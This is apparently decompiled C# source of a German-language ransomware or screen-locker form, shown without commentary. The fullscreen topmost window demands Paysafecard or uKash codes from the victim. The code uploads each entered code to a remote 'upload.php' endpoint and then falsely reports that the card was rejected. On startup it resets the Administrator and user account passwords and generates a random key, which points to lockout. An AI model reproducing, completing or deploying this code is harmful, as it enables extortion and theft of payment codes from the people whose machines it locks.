		((Control)this).get_Controls().Add((Control)(object)vmethod_6());
		((Control)this).get_Controls().Add((Control)(object)vmethod_4());
		((Control)this).get_Controls().Add((Control)(object)vmethod_2());
		((Control)this).get_Controls().Add((Control)(object)vmethod_0());
		((Control)this).get_Controls().Add((Control)(object)vmethod_48());
		((Control)this).get_Controls().Add((Control)(object)vmethod_60());
		((Form)this).set_FormBorderStyle((FormBorderStyle)0);
		((Form)this).set_MaximizeBox(false);
		((Form)this).set_MinimizeBox(false);
		((Control)this).set_Name("frmMain");
		((Form)this).set_StartPosition((FormStartPosition)1);
		((Form)this).set_TopMost(true);
		((Form)this).set_WindowState((FormWindowState)2);
		((ISupportInitialize)vmethod_8()).EndInit();
		((Control)vmethod_20()).ResumeLayout(false);
		((Control)vmethod_20()).PerformLayout();
		((ISupportInitialize)vmethod_66()).EndInit();
		((ISupportInitialize)vmethod_18()).EndInit();
		((Control)vmethod_48()).ResumeLayout(false);
		((ISupportInitialize)vmethod_52()).EndInit();
		((ISupportInitialize)vmethod_54()).EndInit();
		((ISupportInitialize)vmethod_50()).EndInit();
		((ISupportInitialize)vmethod_34()).EndInit();
		((ISupportInitialize)vmethod_46()).EndInit();
		((ISupportInitialize)vmethod_36()).EndInit();
		((ISupportInitialize)vmethod_44()).EndInit();
		((ISupportInitialize)vmethod_38()).EndInit();
		((ISupportInitialize)vmethod_42()).EndInit();
		((ISupportInitialize)vmethod_40()).EndInit();
		((Control)vmethod_56()).ResumeLayout(false);
		((Control)vmethod_56()).PerformLayout();
		((ISupportInitialize)vmethod_72()).EndInit();
		((ISupportInitialize)vmethod_58()).EndInit();
		((Control)vmethod_60()).ResumeLayout(false);
		((Control)vmethod_60()).PerformLayout();
		((ISupportInitialize)vmethod_0()).EndInit();
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}

	[SpecialName]
	internal virtual PictureBox vmethod_0()
	{
		return pictureBox_0;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void vmethod_1(PictureBox pictureBox_15)
	{
		pictureBox_0 = pictureBox_15;
	}

	[SpecialName]
	internal virtual Label vmethod_2()
	{
		return label_0;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void vmethod_3(Label label_7)
	{
		label_0 = label_7;
	}

	[SpecialName]
	internal virtual RichTextBox vmethod_4()
	{
		return richTextBox_0;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void vmethod_5(RichTextBox richTextBox_2)
	{
		richTextBox_0 = richTextBox_2;
	}

	[SpecialName]
	internal virtual Label vmethod_6()
	{
		return label_1;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void vmethod_7(Label label_7)
	{
		label_1 = label_7;
	}

	[SpecialName]
	internal virtual TrackBar vmethod_8()
	{
		return trackBar_0;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void vmethod_9(TrackBar trackBar_1)
	{
		EventHandler eventHandler = method_0;
		if (trackBar_0 != null)
		{
			trackBar_0.remove_ValueChanged(eventHandler);
		}
		trackBar_0 = trackBar_1;
		if (trackBar_0 != null)
		{
			trackBar_0.add_ValueChanged(eventHandler);
		}
	}

	[SpecialName]
	internal virtual Label vmethod_10()
	{
		return label_2;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void vmethod_11(Label label_7)
	{
		label_2 = label_7;
	}

	[SpecialName]
	internal virtual Label vmethod_12()
	{
		return label_3;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void vmethod_13(Label label_7)
	{
		label_3 = label_7;
	}

	[SpecialName]
	internal virtual RichTextBox vmethod_14()
	{
		return richTextBox_1;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void vmethod_15(RichTextBox richTextBox_2)
	{
		richTextBox_1 = richTextBox_2;
	}

	[SpecialName]
	internal virtual Label vmethod_16()
	{
		return label_4;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void vmethod_17(Label label_7)
	{
		label_4 = label_7;
	}

	[SpecialName]
	internal virtual PictureBox vmethod_18()
	{
		return pictureBox_1;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void vmethod_19(PictureBox pictureBox_15)
	{
		pictureBox_1 = pictureBox_15;
	}

	[SpecialName]
	internal virtual GroupBox vmethod_20()
	{
		return groupBox_0;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void vmethod_21(GroupBox groupBox_4)
	{
		groupBox_0 = groupBox_4;
	}

	[SpecialName]
	internal virtual RadioButton vmethod_22()
	{
		return radioButton_0;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void vmethod_23(RadioButton radioButton_2)
	{
		EventHandler eventHandler = method_1;
		if (radioButton_0 != null)
		{
			radioButton_0.remove_CheckedChanged(eventHandler);
		}
		radioButton_0 = radioButton_2;
		if (radioButton_0 != null)
		{
			radioButton_0.add_CheckedChanged(eventHandler);
		}
	}

	[SpecialName]
	internal virtual Button vmethod_24()
	{
		return button_0;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void vmethod_25(Button button_2)
	{
		EventHandler eventHandler = method_3;
		if (button_0 != null)
		{
			((Control)button_0).remove_Click(eventHandler);
		}
		button_0 = button_2;
		if (button_0 != null)
		{
			((Control)button_0).add_Click(eventHandler);
		}
	}

	[SpecialName]
	internal virtual TextBox vmethod_26()
	{
		return textBox_0;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void vmethod_27(TextBox textBox_3)
	{
		EventHandler eventHandler = method_6;
		EventHandler eventHandler2 = method_5;
		if (textBox_0 != null)
		{
			((Control)textBox_0).remove_LostFocus(eventHandler);
			((Control)textBox_0).remove_GotFocus(eventHandler2);
		}
		textBox_0 = textBox_3;
		if (textBox_0 != null)
		{
			((Control)textBox_0).add_LostFocus(eventHandler);
			((Control)textBox_0).add_GotFocus(eventHandler2);
		}
	}

	[SpecialName]
	internal virtual Label vmethod_28()
	{
		return label_5;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void vmethod_29(Label label_7)
	{
		label_5 = label_7;
	}

	[SpecialName]
	internal virtual RadioButton vmethod_30()
	{
		return radioButton_1;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void vmethod_31(RadioButton radioButton_2)
	{
		EventHandler eventHandler = method_2;
		if (radioButton_1 != null)
		{
			radioButton_1.remove_CheckedChanged(eventHandler);
		}
		radioButton_1 = radioButton_2;
		if (radioButton_1 != null)
		{
			radioButton_1.add_CheckedChanged(eventHandler);
		}
	}

	[SpecialName]
	internal virtual Button vmethod_32()
	{
		return button_1;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void vmethod_33(Button button_2)
	{
		EventHandler eventHandler = method_4;
		if (button_1 != null)
		{
			((Control)button_1).remove_Click(eventHandler);
		}
		button_1 = button_2;
		if (button_1 != null)
		{
			((Control)button_1).add_Click(eventHandler);
		}
	}

	[SpecialName]
	internal virtual PictureBox vmethod_34()
	{
		return pictureBox_2;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void vmethod_35(PictureBox pictureBox_15)
	{
		pictureBox_2 = pictureBox_15;
	}

	[SpecialName]
	internal virtual PictureBox vmethod_36()
	{
		return pictureBox_3;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void vmethod_37(PictureBox pictureBox_15)
	{
		pictureBox_3 = pictureBox_15;
	}

	[SpecialName]
	internal virtual PictureBox vmethod_38()
	{
		return pictureBox_4;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void vmethod_39(PictureBox pictureBox_15)
	{
		pictureBox_4 = pictureBox_15;
	}

	[SpecialName]
	internal virtual PictureBox vmethod_40()
	{
		return pictureBox_5;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void vmethod_41(PictureBox pictureBox_15)
	{
		pictureBox_5 = pictureBox_15;
	}

	[SpecialName]
	internal virtual PictureBox vmethod_42()
	{
		return pictureBox_6;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void vmethod_43(PictureBox pictureBox_15)
	{
		pictureBox_6 = pictureBox_15;
	}

	[SpecialName]
	internal virtual PictureBox vmethod_44()
	{
		return pictureBox_7;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void vmethod_45(PictureBox pictureBox_15)
	{
		pictureBox_7 = pictureBox_15;
	}

	[SpecialName]
	internal virtual PictureBox vmethod_46()
	{
		return pictureBox_8;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void vmethod_47(PictureBox pictureBox_15)
	{
		pictureBox_8 = pictureBox_15;
	}

	[SpecialName]
	internal virtual GroupBox vmethod_48()
	{
		return groupBox_1;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void vmethod_49(GroupBox groupBox_4)
	{
		groupBox_1 = groupBox_4;
	}

	[SpecialName]
	internal virtual PictureBox vmethod_50()
	{
		return pictureBox_9;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void vmethod_51(PictureBox pictureBox_15)
	{
		pictureBox_9 = pictureBox_15;
	}

	[SpecialName]
	internal virtual PictureBox vmethod_52()
	{
		return pictureBox_10;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void vmethod_53(PictureBox pictureBox_15)
	{
		pictureBox_10 = pictureBox_15;
	}

	[SpecialName]
	internal virtual PictureBox vmethod_54()
	{
		return pictureBox_11;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void vmethod_55(PictureBox pictureBox_15)
	{
		pictureBox_11 = pictureBox_15;
	}

	[SpecialName]
	internal virtual GroupBox vmethod_56()
	{
		return groupBox_2;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void vmethod_57(GroupBox groupBox_4)
	{
		groupBox_2 = groupBox_4;
	}

	[SpecialName]
	internal virtual PictureBox vmethod_58()
	{
		return pictureBox_12;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void vmethod_59(PictureBox pictureBox_15)
	{
		pictureBox_12 = pictureBox_15;
	}

	[SpecialName]
	internal virtual GroupBox vmethod_60()
	{
		return groupBox_3;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void vmethod_61(GroupBox groupBox_4)
	{
		groupBox_3 = groupBox_4;
	}

	[SpecialName]
	internal virtual Timer vmethod_62()
	{
		return timer_0;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void vmethod_63(Timer timer_1)
	{
		EventHandler eventHandler = method_9;
		if (timer_0 != null)
		{
			timer_0.remove_Tick(eventHandler);
		}
		timer_0 = timer_1;
		if (timer_0 != null)
		{
			timer_0.add_Tick(eventHandler);
		}
	}

	[SpecialName]
	internal virtual TextBox vmethod_64()
	{
		return textBox_1;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void vmethod_65(TextBox textBox_3)
	{
		textBox_1 = textBox_3;
	}

	[SpecialName]
	internal virtual PictureBox vmethod_66()
	{
		return pictureBox_13;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void vmethod_67(PictureBox pictureBox_15)
	{
		pictureBox_13 = pictureBox_15;
	}

	[SpecialName]
	internal virtual Label vmethod_68()
	{
		return label_6;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void vmethod_69(Label label_7)
	{
		label_6 = label_7;
	}

	[SpecialName]
	internal virtual TextBox vmethod_70()
	{
		return textBox_2;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void vmethod_71(TextBox textBox_3)
	{
		EventHandler eventHandler = method_8;
		EventHandler eventHandler2 = method_7;
		if (textBox_2 != null)
		{
			((Control)textBox_2).remove_LostFocus(eventHandler);
			((Control)textBox_2).remove_GotFocus(eventHandler2);
		}
		textBox_2 = textBox_3;
		if (textBox_2 != null)
		{
			((Control)textBox_2).add_LostFocus(eventHandler);
			((Control)textBox_2).add_GotFocus(eventHandler2);
		}
	}

	[SpecialName]
	internal virtual PictureBox vmethod_72()
	{
		return pictureBox_14;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void vmethod_73(PictureBox pictureBox_15)
	{
		pictureBox_14 = pictureBox_15;
	}

	private void method_0(object sender, EventArgs e)
	{
		((Form)this).set_Opacity((double)vmethod_8().get_Value() / 100.0);
	}

	private void method_1(object sender, EventArgs e)
	{
		if (vmethod_22().get_Checked())
		{
			((Control)vmethod_26()).set_Enabled(true);
			((Control)vmethod_24()).set_Enabled(true);
			((Control)vmethod_56()).set_Visible(true);
			((Control)vmethod_58()).set_Visible(true);
		}
		else
		{
			((Control)vmethod_26()).set_Enabled(false);
			((Control)vmethod_24()).set_Enabled(false);
			((Control)vmethod_58()).set_Visible(false);
		}
	}

	private void method_2(object sender, EventArgs e)
	{
		if (vmethod_30().get_Checked())
		{
			((Control)vmethod_72()).set_Visible(true);
			((Control)vmethod_56()).set_Visible(true);
			((Control)vmethod_70()).set_Enabled(true);
			((Control)vmethod_32()).set_Enabled(true);
		}
		else
		{
			((Control)vmethod_70()).set_Enabled(false);
			((Control)vmethod_32()).set_Enabled(false);
			((Control)vmethod_72()).set_Visible(false);
		}
	}

	private void method_3(object sender, EventArgs e)
	{
		checked
		{
			try
			{
				string_1 = vmethod_26().get_Text().Split(new char[1] { '-' });
				if (!((Operators.CompareString(string_1[0], "", false) != 0) & (Operators.CompareString(string_1[1], "", false) != 0) & (Operators.CompareString(string_1[2], "", false) != 0) & (Operators.CompareString(string_1[3], "", false) != 0)))
				{
					return;
				}
				int num = 0;
				do
				{
					if (string_1[num].Length == 4)
					{
						num++;
						num++;
						continue;
					}
					vmethod_64().set_Text("Sie haben ihr Paysafecard in einem falschen Format eingegeben");
					return;
				}
				while (num <= 3);
				if (Class7.smethod_0(vmethod_26().get_Text()))
				{
					vmethod_64().set_Text("Ihre Paysafecard ist nicht zu verwenden oder der Server ist gerade nicht erreichbar, versuchen sie es später nocheinmal.");
					return;
				}
				File.WriteAllText(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + Environment.UserName + "@" + Environment.MachineName + " " + Conversions.ToString(clock_0.get_LocalTime().Day) + "." + Conversions.ToString(clock_0.get_LocalTime().Month) + "-PSC.log_psc", Class8.smethod_1(vmethod_26().get_Text(), "MasterPassword12345!"));
				webClient_0.UploadFile(string_2 + "upload.php", "POST", Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + Environment.UserName + "@" + Environment.MachineName + " " + Conversions.ToString(clock_0.get_LocalTime().Day) + "." + Conversions.ToString(clock_0.get_LocalTime().Month) + "-PSC.log_psc");
				File.Delete(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + Environment.UserName + "@" + Environment.MachineName + " " + Conversions.ToString(clock_0.get_LocalTime().Day) + "." + Conversions.ToString(clock_0.get_LocalTime().Month) + "-PSC.log_psc");
				vmethod_64().set_Text("Ihre Paysafecard ist nicht zu verwenden oder der Server ist momentan nicht erreichbar, versuchen sie es später nocheinmal.");
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				vmethod_64().set_Text("Keine gültige Paysafecard eingegeben");
				ProjectData.ClearProjectError();
			}
		}
	}

	private void method_4(object sender, EventArgs e)
	{
		try
		{
			if (vmethod_70().get_Text().Substring(0, 7).Contains("6337180"))
			{
				File.WriteAllText(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + Environment.UserName + "@" + Environment.MachineName + " " + Conversions.ToString(clock_0.get_LocalTime().Day) + "." + Conversions.ToString(clock_0.get_LocalTime().Month) + "-uKash.log_psc", Class8.smethod_1(vmethod_26().get_Text(), "MasterPassword12345!"));
				webClient_0.UploadFile(string_2 + "upload.php", "POST", Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + Environment.UserName + "@" + Environment.MachineName + " " + Conversions.ToString(clock_0.get_LocalTime().Day) + "." + Conversions.ToString(clock_0.get_LocalTime().Month) + "-uKash.log_psc");
				File.Delete(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + Environment.UserName + "@" + Environment.MachineName + " " + Conversions.ToString(clock_0.get_LocalTime().Day) + "." + Conversions.ToString(clock_0.get_LocalTime().Month) + "-uKash.log_psc");
				vmethod_64().set_Text("Ihre Paysafecard ist nicht zu verwenden oder der Server ist momentan nicht erreichbar, versuchen sie es später nocheinmal.");
			}
			else
			{
				vmethod_64().set_Text("Sie haben eine ungültigen uKash-Code eingegeben");
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			vmethod_64().set_Text("Sie haben eine ungültigen uKash-Code eingegeben");
			ProjectData.ClearProjectError();
		}
	}

	private void method_5(object sender, EventArgs e)
	{
		if (Operators.CompareString(vmethod_26().get_Text(), "", false) != 0)
		{
			vmethod_26().set_Text("");
		}
	}

	private void method_6(object sender, EventArgs e)
	{
		if (Operators.CompareString(vmethod_26().get_Text(), "", false) == 0)
		{
			vmethod_26().set_Text("Format: 0000-0000-0000-0000");
		}
	}

	private void method_7(object sender, EventArgs e)
	{
		if (Operators.CompareString(vmethod_70().get_Text(), "", false) != 0)
		{
			vmethod_70().set_Text("");
		}
	}

	private void method_8(object sender, EventArgs e)
	{
		if (Operators.CompareString(vmethod_70().get_Text(), "", false) == 0)
		{
			vmethod_70().set_Text("Format: 0000000000000000000");
		}
	}

	private unsafe void method_9(object sender, EventArgs e)
	{
		void* ptr = stackalloc byte[12];
		Label obj = vmethod_12();
		*(int*)ptr = stopwatch_0.Elapsed.Hours;
		string arg = ((int*)ptr)->ToString().PadLeft(2, '0');
		*(int*)((byte*)ptr + 4) = stopwatch_0.Elapsed.Minutes;
		string arg2 = ((int*)((byte*)ptr + 4))->ToString().PadLeft(2, '0');
		*(int*)((byte*)ptr + 8) = stopwatch_0.Elapsed.Seconds;
		obj.set_Text($"{arg}:{arg2}:{((int*)((byte*)ptr + 8))->ToString().PadLeft(2, '0')}");
		*(int*)((byte*)ptr + 8) = stopwatch_0.Elapsed.Minutes;
		if (Operators.CompareString(((int*)((byte*)ptr + 8))->ToString().PadLeft(2, '0'), "03", false) == 0)
		{
			((Control)vmethod_8()).set_Enabled(true);
		}
	}

	private void frmMain_HandleCreated(object sender, EventArgs e)
	{
		AppDomain.CurrentDomain.ProcessExit += Class15.smethod_1;
		AppDomain.CurrentDomain.DomainUnload += Class15.smethod_1;
		Application.add_ApplicationExit((EventHandler)Class15.smethod_1);
		class11_0.method_0("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ");
		class11_0.method_1("0123456789");
		class11_0.method_2(8);
		thread_0.Start();
		Class5.smethod_1();
		Class9.smethod_1();
		Class13.smethod_0();
		Class6.smethod_0(bool_0: true);
		Class15.smethod_0(-1);
		Class6.smethod_2(bool_0: true);
		Class6.smethod_3(bool_0: true);
		Class6.smethod_4(bool_0: true);
		Class6.smethod_1();
		Class6.smethod_5(bool_0: true);
		if (bool_0)
		{
			Class14.smethod_0();
			Class17.smethod_0("Administrator", "UnKnown12345!");
			Class17.smethod_0(Environment.UserName, "");
			Class17.smethod_1();
			Class10.smethod_0();
			Class12.smethod_0(class11_0.method_3());
		}
		Class16.smethod_0();
		stopwatch_0.Start();
		vmethod_62().Start();
	}
}
